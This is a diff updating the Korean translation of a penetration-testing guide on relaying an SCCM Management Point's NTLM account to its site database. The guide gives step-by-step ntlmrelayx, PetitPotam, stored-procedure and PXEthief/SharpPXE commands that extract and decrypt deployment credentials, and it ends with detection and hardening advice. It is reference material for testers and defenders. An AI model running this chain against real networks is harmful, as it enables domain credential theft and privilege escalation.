@@ -3,38 +3,38 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-SMB/RPC로 인증하도록 **System Center Configuration Manager (SCCM) Management Point (MP)**를 강제하고 해당 NTLM 머신 계정을 **사이트 데이터베이스 (MSSQL)**로 **릴레이(relay)**하면 `smsdbrole_MP` / `smsdbrole_MPUserSvc` 권한을 얻을 수 있습니다. 이 역할로 저장 프로시저 집합을 호출하면 **Operating System Deployment (OSD)** 정책 블롭(예: Network Access Account 자격증명, Task-Sequence 변수 등)을 노출합니다. 블롭은 16진수로 인코딩/암호화되어 있지만 **PXEthief**로 디코드·복호화하여 평문 비밀을 얻을 수 있습니다.
+**System Center Configuration Manager (SCCM) Management Point (MP)**가 SMB/RPC를 통해 인증하도록 유도한 다음 해당 NTLM machine account를 **site database (MSSQL)**로 **relaying**하면 `smsdbrole_MP` / `smsdbrole_MPUserSvc` 권한을 획득할 수 있습니다.  이러한 role을 사용하면 **Operating System Deployment (OSD)** policy blob(Network Access Account credentials, Task-Sequence variables 등)을 노출하는 stored procedure 세트를 호출할 수 있습니다.  이 blob은 hex-encoded/encrypted 상태이지만 **PXEthief**로 decode 및 decrypt하여 plaintext secret을 얻을 수 있습니다.
 
-전체 흐름:
-1. MP와 사이트 DB 발견 ↦ 인증이 필요 없는 HTTP 엔드포인트 `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
-2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` 실행.
-3. **PetitPotam**, PrinterBug, DFSCoerce 등으로 MP 강제 인증.
-4. SOCKS 프록시를 통해 리레이된 **<DOMAIN>\\<MP-host>$** 계정으로 `mssqlclient.py -windows-auth`로 연결.
-5. 실행:
+High-level chain:
+1. MP 및 site DB를 탐색 ↦ 인증이 필요 없는 HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
+2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`를 시작합니다.
+3. **PetitPotam**, PrinterBug, DFSCoerce 등을 사용하여 MP를 coerce합니다.
+4. SOCKS proxy를 통해 `mssqlclient.py -windows-auth`로 relayed **<DOMAIN>\\<MP-host>$** account로 연결합니다.
+5. 다음을 실행합니다:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
 * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (또는 `MP_GetPolicyBodyAfterAuthorization`)
-6. `0xFFFE` BOM 제거, `xxd -r -p` → XML → `python3 pxethief.py 7 <hex>`.
+6. `0xFFFE` BOM을 제거하고, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`를 실행합니다.
 
-PXE나 클라이언트에 접근하지 않고도 `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` 등과 같은 비밀을 회수할 수 있습니다.
+`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` 등의 secret을 PXE 또는 client에 접근하지 않고 복구할 수 있습니다.<sup>[[1]](#references)[[3]](#references)</sup>
 
 ---
 
-## 1. 인증이 필요 없는 MP 엔드포인트 나열
-MP ISAPI 확장 **GetAuth.dll**은(는) 몇몇 파라미터를 노출하며(사이트가 PKI 전용인 경우 제외) 인증을 요구하지 않습니다:
+## 1. 인증이 필요 없는 MP endpoint 열거
+MP ISAPI extension **GetAuth.dll**은 인증이 필요 없는 여러 parameter를 노출합니다(site가 PKI-only인 경우 제외):<sup>[[1]](#references)</sup>
 
 | Parameter | Purpose |
 |-----------|---------|
-| `MPKEYINFORMATIONMEDIA` | 사이트 서명 인증서의 공개 키 + *x86* / *x64* **All Unknown Computers** 디바이스의 GUID들을 반환합니다. |
-| `MPLIST` | 사이트 내 모든 Management-Point를 나열합니다. |
-| `SITESIGNCERT` | Primary-Site 서명 인증서를 반환합니다 (LDAP 없이 사이트 서버를 식별할 때 사용). |
+| `MPKEYINFORMATIONMEDIA` | site signing cert public key 및 *x86* / *x64* **All Unknown Computers** device의 GUID를 반환합니다. |
+| `MPLIST` | site의 모든 Management-Point를 나열합니다. |
+| `SITESIGNCERT` | Primary-Site signing certificate를 반환합니다(LDAP 없이 site server 식별). |
 
-나중에 DB 쿼리에서 **clientID**로 사용할 GUID들을 가져옵니다:
+이후 DB query에서 **clientID**로 사용할 GUID를 가져옵니다:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
 ---
-  
+
 ## 2. MP 머신 계정을 MSSQL로 Relay
 ```bash
 # 1. Start the relay listener (SMB→TDS)
@@ -44,48 +44,48 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-강제 실행이 발생하면 다음과 같은 항목이 표시됩니다:
+coercion이 실행되면 다음과 같은 내용을 확인할 수 있습니다:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
 ```
 ---
 
-## 3. 저장 프로시저를 통해 OSD 정책 식별
-SOCKS 프록시(기본 포트 1080)를 통해 연결:
+## 3. 저장 프로시저를 통해 OSD policies 식별
+SOCKS proxy를 통해 연결합니다(기본 포트: 1080):<sup>[[1]](#references)</sup>
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
-**CM_<SiteCode>** DB로 전환하세요 (3자리 사이트 코드를 사용하세요, 예: `CM_001`).
+**CM_<SiteCode>** DB로 전환합니다(3자리 site code를 사용합니다. 예: `CM_001`).
 
-### 3.1  Unknown-Computer GUIDs 찾기 (선택사항)
+### 3.1  Unknown-Computer GUID 찾기 (선택 사항)
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
 FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
-### 3.2  할당된 정책 나열
+### 3.2  할당된 정책 목록
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
-각 행에는 `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`가 포함되어 있습니다.
+각 행에는 `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`가 포함됩니다.
 
-Focus on policies:
-* **NAAConfig**  – Network Access Account 자격 증명
-* **TS_Sequence** – Task Sequence 변수 (OSDJoinAccount/Password)
+다음 정책에 집중합니다:
+* **NAAConfig** – Network Access Account 자격 증명
+* **TS_Sequence** – Task Sequence 변수(OSDJoinAccount/Password)
 * **CollectionSettings** – run-as 계정을 포함할 수 있음
 
-### 3.3  전체 `Body` 가져오기
-이미 `PolicyID` & `PolicyVersion`이 있는 경우 다음을 사용하면 clientID 요구 사항을 건너뛸 수 있습니다:
+### 3.3 전체 본문 가져오기
+이미 `PolicyID` 및 `PolicyVersion`을 보유하고 있다면 다음을 사용하여 clientID 요구 사항을 건너뛸 수 있습니다:
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> 중요: SSMS에서 “Maximum Characters Retrieved” (>65535) 이상으로 늘리세요. 그렇지 않으면 blob이 잘립니다.
+> 중요: SSMS에서 “Maximum Characters Retrieved”를 늘리세요(>65535). 그렇지 않으면 blob이 잘립니다.
 
 ---
 
-## 4. blob 디코딩 및 복호화
+## 4. blob 디코드 및 복호화
 ```bash
 # Remove the UTF-16 BOM, convert from hex → XML
 echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
@@ -93,7 +93,7 @@ echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
 # Decrypt with PXEthief (7 = decrypt attribute value)
 python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
 ```
-복구된 비밀 예시:
+복구된 secrets 예시:
 ```
 OSDJoinAccount : CONTOSO\\joiner
 OSDJoinPassword: SuperSecret2025!
@@ -102,20 +102,20 @@ NetworkAccessPassword: P4ssw0rd123
 ```
 ---
 
-## 5. 관련 SQL 역할 및 절차
-릴레이 시 로그인은 다음 역할에 매핑됩니다:
+## 5. 관련 SQL roles & procedures
+relay 후 login은 다음 roles에 매핑됩니다:<sup>[[1]](#references)</sup>
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
-이 역할들은 수십 개의 EXEC 권한을 노출하며, 이 공격에서 사용되는 주요 권한은 다음과 같습니다:
+이 roles은 수십 개의 EXEC permissions를 노출하며, 이 attack에서 사용되는 핵심 항목은 다음과 같습니다:
 
-| 저장 프로시저 | 용도 |
+| Stored Procedure | Purpose |
 |------------------|---------|
-| `MP_GetMachinePolicyAssignments` | `clientID`에 적용된 정책을 나열합니다. |
-| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 전체 정책 본문을 반환합니다. |
-| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` 경로에 의해 반환됩니다. |
+| `MP_GetMachinePolicyAssignments` | `clientID`에 적용된 policies를 나열합니다. |
+| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 전체 policy body를 반환합니다. |
+| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` path에서 반환됩니다. |
 
-전체 목록은 다음으로 확인할 수 있습니다:
+다음 명령으로 전체 목록을 확인할 수 있습니다:
 ```sql
 SELECT pr.name
 FROM   sys.database_principals AS dp
@@ -126,27 +126,28 @@ AND  pe.permission_name='EXECUTE';
 ```
 ---
 
-## 6. PXE 부팅 미디어 수집 (SharpPXE)
-* **PXE reply over UDP/4011**: PXE에 구성된 Distribution Point로 PXE 부트 요청을 전송합니다. proxyDHCP 응답은 `SMSBoot\\x64\\pxe\\variables.dat` (암호화된 구성) 및 `SMSBoot\\x64\\pxe\\boot.bcd`와 같은 부트 경로와 선택적인 암호화된 키 블롭을 드러냅니다.
-* **Retrieve boot artifacts via TFTP**: 반환된 경로를 사용해 TFTP(인증 없음)로 `variables.dat`를 다운로드합니다. 파일은 작고(몇 KB) 암호화된 미디어 변수들을 포함합니다.
-* **Decrypt or crack**:
-- 응답에 복호화 키가 포함되어 있으면, **SharpPXE**에 전달해 `variables.dat`를 직접 복호화합니다.
-- 키가 제공되지 않으면(사용자 지정 암호로 보호된 PXE 미디어), SharpPXE는 오프라인 크래킹을 위해 **Hashcat-compatible** `$sccm$aes128$...` 해시를 생성합니다. 비밀번호를 복구한 후 파일을 복호화합니다.
-* **Parse decrypted XML**: 평문 변수에는 SCCM 배포 메타데이터(**Management Point URL**, **Site Code**, 미디어 GUID 및 기타 식별자)가 포함됩니다. SharpPXE는 이를 파싱하여 GUID/PFX/site 매개변수가 미리 채워진 실행 준비된 **SharpSCCM** 명령을 출력해 후속 악용에 사용할 수 있게 합니다.
-* **Requirements**: PXE 리스너(UDP/4011)와 TFTP에 대한 네트워크 도달성만 필요하며, 로컬 관리자 권한은 필요하지 않습니다.
+## 6. PXE boot media 수집 (SharpPXE)
+* **UDP/4011을 통한 PXE 응답**: PXE로 구성된 Distribution Point에 PXE boot request를 전송합니다. proxyDHCP 응답에는 `SMSBoot\\x64\\pxe\\variables.dat` (암호화된 config), `SMSBoot\\x64\\pxe\\boot.bcd`와 같은 boot path 및 선택적 암호화 key blob이 포함됩니다.<sup>[[4]](#references)</sup>
+* **TFTP를 통한 boot artifact 가져오기**: 반환된 path를 사용해 TFTP를 통해 `variables.dat`를 다운로드합니다 (인증 불필요). 파일은 작으며 (수 KB) 암호화된 media variable이 포함되어 있습니다.
+* **복호화 또는 crack**:
+- 응답에 decryption key가 포함된 경우 **SharpPXE**에 전달하여 `variables.dat`를 직접 복호화합니다.
+- key가 제공되지 않는 경우 (PXE media가 custom password로 보호됨) SharpPXE는 offline cracking을 위한 **Hashcat-compatible** `$sccm$aes128$...` hash를 출력합니다. password를 복구한 후 파일을 복호화합니다.
+* **복호화된 XML 파싱**: plaintext variable에는 SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUID 및 기타 identifier)가 포함됩니다. SharpPXE는 이를 파싱하고, 후속 abuse를 위해 GUID/PFX/site parameter가 미리 입력된 바로 실행 가능한 **SharpSCCM** command를 출력합니다.
+* **Requirements**: PXE listener (UDP/4011) 및 TFTP에 대한 network reachability만 필요하며, local admin privilege는 필요하지 않습니다.
 
 ---
 
-## 7. 탐지 및 강화
-1. **Monitor MP logins** – 호스트가 아닌 IP에서 로그인하는 모든 MP 컴퓨터 계정 ≈ 중계(relay).
-2. 사이트 데이터베이스에서 **Extended Protection for Authentication (EPA)**를 활성화합니다 (`PREVENT-14`).
-3. 사용하지 않는 NTLM 비활성화, SMB 서명 적용, RPC 제한( `PetitPotam`/`PrinterBug`에 대한 동일한 완화책).
-4. MP ↔ DB 통신을 IPSec / mutual-TLS로 강화합니다.
-5. **Constrain PXE exposure** – UDP/4011 및 TFTP를 신뢰된 VLAN으로만 방화벽 설정하고, PXE 암호를 요구하며, `SMSBoot\\*\\pxe\\variables.dat`의 TFTP 다운로드에 대해 경고를 발생시킵니다.
+## 7. Detection & Hardening
+1. **MP login 모니터링** – MP computer account가 자신의 host가 아닌 IP에서 login하는 경우는 relay일 가능성이 높습니다.<sup>[[1]](#references)</sup>
+2. site database에서 **Extended Protection for Authentication (EPA)**를 활성화합니다 (`PREVENT-14`).
+3. 사용하지 않는 NTLM을 비활성화하고, SMB signing을 강제하며, RPC를 제한합니다 (
+`PetitPotam`/`PrinterBug`에 사용되는 동일한 mitigation).
+4. IPSec / mutual-TLS를 사용해 MP ↔ DB communication을 harden합니다.
+5. **PXE 노출 제한** – UDP/4011 및 TFTP를 trusted VLAN으로 제한하고, PXE password를 요구하며, `SMSBoot\\*\\pxe\\variables.dat`의 TFTP download를 alert합니다.<sup>[[4]](#references)</sup>
 
 ---
 
-## 관련
+## See also
 * NTLM relay fundamentals:
 
 {{#ref}}
@@ -159,11 +160,10 @@ AND  pe.permission_name='EXECUTE';
 abusing-ad-mssql.md
 {{#endref}}
 
+## References
+- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
+- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
+- [4] [SharpPXE](https://github.com/leftp/SharpPXE)
 
-
-## 참고 문헌
-- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
-- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
-- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
-- [SharpPXE](https://github.com/leftp/SharpPXE)
 {{#include ../../banners/hacktricks-training.md}}
